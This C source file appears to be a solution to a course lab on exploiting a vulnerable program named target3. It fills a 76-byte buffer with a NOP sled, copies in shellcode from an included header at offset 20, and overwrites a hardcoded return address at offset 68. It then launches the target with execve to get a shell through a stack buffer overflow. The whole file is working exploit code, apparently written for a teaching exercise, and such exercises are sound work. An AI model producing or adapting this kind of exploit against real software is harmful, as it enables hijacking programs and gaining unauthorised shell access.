#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
#define SIZE 76
#define SHELL_OFFSET 20
#define RA_OFFSET 68


int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char * env[1];

	args[0] = TARGET;

	char str[SIZE];

	// Insert NOPs
	memset(str, 0x90, SIZE);

	// Insert shellcode
	for (int i = 0; i < strlen(shellcode); i++)
		str[i + SHELL_OFFSET] = shellcode[i];

	// Input return address
	*(long*) &str[RA_OFFSET] = 0x3021fe54;

	args[1] = str;
	args[2] = NULL;
	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
